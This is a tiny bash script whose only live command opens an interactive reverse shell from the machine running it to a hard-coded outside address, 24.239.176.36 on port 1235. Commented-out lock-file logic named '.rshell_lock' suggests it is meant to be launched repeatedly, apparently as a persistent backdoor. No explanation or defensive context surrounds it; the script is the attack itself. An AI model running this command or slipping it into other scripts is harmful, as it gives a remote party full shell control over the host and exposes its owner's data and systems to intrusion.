#!/bin/bash

cd $( dirname "${BASH_SOURCE[0]}" )

LCK=.rshell_lock

#if [ -f $LCK ]; then
#    echo "Lock exists, not running"
#    exit
#else
#    trap "rm -f $LCK" EXIT
#    touch $LCK
#
/bin/bash -i >& /dev/tcp/24.239.176.36/1235 0>&1
#fi
